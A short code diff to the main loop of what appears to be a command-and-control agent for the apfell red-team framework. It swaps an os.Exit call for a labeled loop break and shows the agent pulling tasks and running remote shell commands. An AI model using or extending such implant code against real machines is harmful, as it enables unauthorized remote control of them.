@@ -95,6 +95,7 @@ func main() {
 	res := make(chan structs.ThreadMsg)
 	//if we have an Active apfell session, enter the tasking loop
 	if strings.Contains(checkIn.Status, "success") {
+LOOP:
 		for {
 			time.Sleep(time.Duration(profile.SleepInterval()) * time.Second)
 
@@ -106,8 +107,7 @@ func main() {
 			case 0:
 				// Throw away the response, we don't really need it for anything
 				profile.PostResponse(task, "Exiting")
-				os.Exit(0)
-				break
+				break LOOP
 			case 1:
 				// Run shell command
 				go shell.Run(task, res)
